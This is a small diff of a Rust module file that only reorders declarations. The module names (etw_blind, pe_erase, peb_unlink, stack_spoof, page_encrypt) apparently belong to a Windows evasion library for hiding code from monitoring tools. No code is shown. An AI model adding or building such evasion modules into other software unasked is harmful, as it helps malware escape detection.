@@ -12,16 +12,16 @@
 
 pub mod alloc;
 pub mod etw_blind;
+pub mod page_encrypt;
+pub mod page_guard;
 #[cfg(windows)]
 pub mod pe_erase;
 #[cfg(windows)]
 pub mod peb_unlink;
-pub mod page_encrypt;
-pub mod page_guard;
 pub mod stack_spoof;
-pub mod trampoline;
 pub mod text_encrypt;
 pub mod thread_pool;
+pub mod trampoline;
 
 use std::sync::atomic::{AtomicBool, Ordering};
 
